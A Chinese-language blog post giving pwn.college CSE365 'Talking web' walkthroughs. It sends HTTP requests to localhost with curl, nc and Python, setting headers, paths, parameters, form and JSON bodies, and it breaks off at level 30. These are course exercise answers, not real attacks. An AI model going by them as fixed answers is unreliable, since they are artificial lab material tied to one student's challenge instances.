<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ASU CSE365-23Fall 连接靶机  首先使用ssh-keygen命令生成密钥对： 1ssh-keygen -f pwn_college_key -N &#39;&#39;  -f指定了生成的密钥文件的名称（pwn_college_key） -N用于设置密码，上述命令中将密码设为空  使用cat查看公钥，并保存到pwn.college中： 1cat pwn_college_key.pub 使用ssh公钥">
<meta property="og:type" content="article">
<meta property="og:title" content="CSE365-23Fall">
<meta property="og:url" content="http://example.com/2024/10/09/CSE365/index.html">
<meta property="og:site_name" content="hxt&#39;s Blog">
<meta property="og:description" content="ASU CSE365-23Fall 连接靶机  首先使用ssh-keygen命令生成密钥对： 1ssh-keygen -f pwn_college_key -N &#39;&#39;  -f指定了生成的密钥文件的名称（pwn_college_key） -N用于设置密码，上述命令中将密码设为空  使用cat查看公钥，并保存到pwn.college中： 1cat pwn_college_key.pub 使用ssh公钥">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404121837822.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404131908412.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181839763.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181827025.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192154038.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192217413.png">
<meta property="og:image" content="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">
<meta property="og:image" content="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105701266.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802105617577.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240802111654091.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803104543316.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20240803153341591.png">
<meta property="article:published_time" content="2024-10-08T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-12T02:45:43.841Z">
<meta property="article:author" content="hxt">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="CSE365">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404121837822.png">

<link rel="canonical" href="http://example.com/2024/10/09/CSE365/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CSE365-23Fall | hxt's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hxt's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/09/CSE365/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CSE365-23Fall
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-09 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-09T00:00:00+08:00">2024-10-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-12 10:45:43" itemprop="dateModified" datetime="2024-10-12T10:45:43+08:00">2024-10-12</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSE365/" itemprop="url" rel="index"><span itemprop="name">CSE365</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" >
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>75k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1:08</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>ASU CSE365-23Fall</p>
<h2 id="连接靶机">连接靶机</h2>
<ul>
<li><p>首先使用<code>ssh-keygen</code>命令生成密钥对：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f pwn_college_key -N ''</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>-f</code>指定了生成的密钥文件的名称（pwn_college_key）</p>
<p><code>-N</code>用于设置密码，上述命令中将密码设为空</p>
</blockquote></li>
<li><p>使用<code>cat</code>查看公钥，并保存到pwn.college中：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat pwn_college_key.pub</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>使用ssh公钥登录靶机：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i pwn_college_key hacker@dojo.pwn.college</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p><code>-i</code>指定一个 RSA 或 DSA 认证所需的身份(私钥)文件</p>
</blockquote></li>
</ul>
<p>上述步骤只在第一次连接是使用，后面只需要运行第三步命令即可直接登录靶机</p>
<p>连接成功后，执行<code>/challenge/run</code>，得到对应题目的提示和要求</p>
<h2 id="talking-web">Talking web</h2>
<h3 id="知识点">知识点</h3>
<ul>
<li><p>World Wide Web（万维网）</p></li>
<li><p>HTTP协议</p></li>
<li><p>抽象、分层（从下往上依次是：数据链路层、网络层、传输层、应用层）</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404121837822.png" alt="image-20240412183732411">
<figcaption aria-hidden="true">image-20240412183732411</figcaption>
</figure></li>
<li><p>HTTP Request</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host ：请求的资源在哪个主机的端口上</span><br><span class="line">Connection：该请求支持长连接（heep_alive）</span><br><span class="line">Content-Length：正文内容长度</span><br><span class="line">Content-Type：数据类型</span><br><span class="line">User-Agent：声明用户的操作系统和浏览器版本信息</span><br><span class="line">Accent：发起了请求</span><br><span class="line">Referer：当前页面是从哪个页面跳转过来的</span><br><span class="line">Accept-Encoding：接受的编码</span><br><span class="line">Accept-Language：接受的语言类型</span><br><span class="line">Cookie：用于在客户端存储少量信息，通常用于实现会话（session）功能</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>HTTP Response</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>URL</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404131908412.png" alt="image-20240413190753656">
<figcaption aria-hidden="true">image-20240413190753656</figcaption>
</figure></li>
<li><p>HTTP是无状态的，使用<strong>Cookie</strong>记录状态（cookie保存在本地）</p>
<p><strong>Session</strong>保存在服务器，保存用户数据</p>
<p>cookie中可包含sessionID，发送给服务器</p></li>
<li><p><code>curl</code>使用方法参考：https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</p></li>
<li><p>Cookie 和 Session</p>
<ol type="1">
<li><p><strong>客户端请求服务器</strong>：用户第一次访问网站时，浏览器向服务器发送请求。</p></li>
<li><p><strong>服务器创建 session</strong>：服务器为该用户创建一个
session，并生成一个唯一的 session ID。</p></li>
<li><p><strong>服务器发送响应</strong>：服务器在响应中将 session ID 作为
cookie 发送给客户端。</p></li>
<li><p><strong>浏览器存储 cookie</strong>：浏览器接收到响应后，会将
session ID 存储在 cookie 中。</p></li>
<li><p><strong>后续请求带上
cookie</strong>：用户在同一个会话期间的后续请求中，浏览器会自动带上这个
cookie（包含 session ID）。</p></li>
<li><p><strong>服务器识别 session</strong>：服务器通过读取请求中的
cookie（包含的 session ID）来识别用户的
session，并获取相应的会话数据。</p></li>
</ol></li>
</ul>
<h3 id="练习">练习</h3>
<p>每次开始练习时，先运行<code>/challenge/run</code>，查看相关说明</p>
<ul>
<li><p>level1：利用<code>curl</code>发送http请求</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl https://www.example.com     <span class="comment"># GET请求</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>wp：<code>curl http://127.0.0.1:80</code></p></li>
<li><p>level2：利用<code>nc</code>发送http请求</p>
<p>首先使用<code>nc</code>连接到本地IP地址的80端口，然后发送<code>GET</code>请求，下面是wp</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level3：利用<code>python</code>发送http请求</p>
<p>需要使用到<code>requests</code>库，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">'http://127.0.0.1'</span>).text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level4：利用<code>curl</code>设置http请求中 host header
的内容（也就是标头中的host字段）</p>
<p>使用<code>-H</code>字段设置相关标头，wp如下：(注意冒号)</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H "Host:0bfda002ec7962e08e63679d3d22694b" http://127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level5：利用<code>nc</code>设置host标头内容，步骤同level2，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /</span><br><span class="line">Host:169dc7ff994e9acd9d0ae7bef90dd3c7</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level6：利用<code>python</code>设置host标头内容，还是使用<code>requests</code>库的<code>get</code>方法</p>
<p>wp如下：（注意<code>headers</code>参数的形式——字典格式）</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>,headers={<span class="string">"Host"</span>:<span class="string">"9542430ae678bb9c2fd8d9a4a5d01b75"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level7：利用<code>curl</code>实现给定路径的http请求</p>
<p>wp如下：（直接在IP地址后加上路径即可）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/27bda61e68b88d620ed0cf93dd82a300</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level8：利用<code>nc</code>实现给定路径的http请求，方法同之前的nc</p>
<p>wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /ed5ae3bb64a225166b7f620fec91e5fa</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level9：利用<code>python</code>实现给定路径的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/c5a8acd2998355601e9c25c41a456f8e"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level10：利用<code>curl</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
<p>原路径：<code>/4aacced3 1e17a60e/aa91069c 11d30773</code></p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1/4aacced3%201e17a60e/aa91069c%2011d30773</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>leve11：利用<code>nc</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /0749640b%200fe072d0/ada2996d%206bad362c</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level12：利用<code>python</code>实现URL编码后的路径（包含空格）的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/29b2f212%20ac7dee8c/6326b468%206cb1da77"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level13：利用<code>curl</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1?a=5d4ed57dc4ed9b68aaac7deda7cd9a27</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level14：利用<code>nc</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=0e25a7e3d8077f06dc35a1823aeaa569</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>注意这里query的内容直接在GET后面，而不是存在于标头的其他字段中</p></li>
<li><p>level15：利用<code>python</code>实现包含指定参数的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag =requests.get(<span class="string">"http://127.0.0.1?a=afab141c4a9e843db55e4a81816602d1"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level16：利用<code>curl</code>实现包含多个参数的http请求，注意题目给出的参数值可能包含空格和特殊字符，需要先用URL编码后再运行，wp如下：(注意这里需要加引号，不然<code>&amp;</code>会被shell解析，而不是被curl解析)</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl "127.0.0.1/?a=b8dbc24d45679b6e349122d71ea38e70&amp;b=aede2913%204570a</span><br><span class="line"><span class="meta prompt_">124%</span><span class="language-bash">26859cbce2%23d6a8532c<span class="string">"</span></span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level17：利用<code>nc</code>实现包含多个参数的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=f4795b314fa022d21753a3ccdc037396&amp;b=19e098b0%20c1e3ffc6%260ea9c1d8%2353e69e00</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level18：利用<code>python</code>实现包含多个参数的http请求，wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/?a=1dc9ca4ec624516c5f17232cccf1290e&amp;b=deaaa58c%20ea168caa%26ba7e648d%23f1322933"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level19：利用<code>curl</code>实现包含表单数据的http请求，使用<code>-d</code>参数可以指定<strong>POST</strong>请求的数据，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d "a=9a3879fa28637bf12b9eae87317f6f09" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level20：利用<code>nc</code>实现包含表单数据的http请求，wp如下：（<code>Content-Type</code>和<code>Content-Length</code>是必须存在的字段，否则报错）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 34\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=75236b164f727c132ec2d3c19b1db9da" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<p>这里<code>-e</code>告诉<code>echo</code>命令对特殊字符进行解释（例如<code>\r</code>,<code>\n</code>），<code>|</code>管道符将一个命令的输出传递给另一个命令的输入，<code>\r\n</code>
的组合用于表示一个换行操作。<code>\r</code> 表示回车符，而
<code>\n</code> 表示换行符。</p>
<blockquote>
<p>在早期的打字机和计算机系统中，回车和换行是两个不同的操作。回车是将打印头移动到行的开头，而换行是将纸张（或屏幕）上的滚动到下一行的开头。因此，回车和换行两者通常一起使用，以便在文本中创建新的行。</p>
<p>在ASCII和类似的字符编码标准中，回车符被编码为十进制值13，通常表示为
<code>\r</code>。换行符被编码为十进制值10，通常表示为
<code>\n</code>。</p>
<p>不同的操作系统采用了不同的惯例来表示换行。例如：</p>
<ul>
<li>在早期的Macintosh系统中，换行符为回车符。</li>
<li>在Unix和类Unix系统中，换行符为换行符（LF，Line Feed）。</li>
<li>在早期的微软DOS和Windows系统中，换行符由回车加换行（<strong>CRLF</strong>，Carriage
Return + Line Feed）组成。</li>
</ul>
</blockquote>
<ul>
<li><p>level21：利用<code>python</code>实现包含表单数据的http请求，wp如下：(使用<code>post</code>方法)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a758fc5442beded11613c025389e9e24"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level22：利用<code>curl</code>实现包含多个表单数据的http请求，wp如下：</p>
<p>同leve19</p></li>
<li><p>level23：利用<code>nc</code>实现包含多个表单数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 78\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=02e05707979b92341471a4754f7237ae&amp;b=fddf3ce0%20c765b9f1%269d251f3c%23552a07ba" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level24：利用<code>python</code>实现包含多个表单数据的http请求，wp如下：(注意这里可以不用对数据使用URL编码)</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a07ff34cf5dea70e6e31c83edb478217"</span>,<span class="string">"b"</span>:<span class="string">"6a5a088f 3218da24&amp;59d6fbf5#6ed02d14"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level25：利用<code>curl</code>实现包含json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d '{"a":"8638b985e542e67fb7b37160002dbe68"}' -H 'Content-Type:application/json' 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level26：利用<code>nc</code>实现包含json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e 'POST / HTTP/1.1\r\nContent-Length: 40\r\nContent-Type: application/json\r\n\r\n{"a":"4d2c1a100629302982b1e18109ec7a71"}' | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure>
<p>注意：<code>Content-Length</code>的数值是<code>{"a":"4d2c1a100629302982b1e18109ec7a71"}</code>中所有字符数</p></li>
<li><p>level27：利用<code>python</code>实现包含json数据的http请求</p>
<p>使用<code>requests</code>库的<code>post</code>方法：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data={key: value}, json={key: value}, args)</span><br></pre></td></tr></tbody></table></figure>
<p>wp如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json={<span class="string">"a"</span>:<span class="string">"0f7e756c8025195bdcea9ad27f654aa5"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level28：利用<code>curl</code>实现包含复杂json数据的http请求，wp如下：（注意json格式中数据不用转为URL编码）</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">'{"a":"c0bdab515fee54f5e283f6d3c463114e", "b":{"c":"34045ace","d":["c980a47e","49791158 3a2d4d50&amp;af0e06be#7775e47c"]}}'</span> -H <span class="string">'Content-Type: application/json'</span> 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>json格式的正确性可用https://www.json.cn/网站进行检查</p>
</blockquote></li>
<li><p>level29：利用<code>nc</code>实现包含复杂json数据的http请求，wp如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">'POST / HTTP/1.1\r\nContent-Length: 122\r\nContent-Type: application/json\r\n\r\n{"a": "5b0edfe197f11902659671d4a8bbb45f","b": {"c": "d2452133", "d": ["213ad821","0d8a195a be586677&amp;df1106fc#cf339e36"]}}'</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>level30：利用<code>python</code>实现包含复杂json数据的http请求，wp如下：</p>
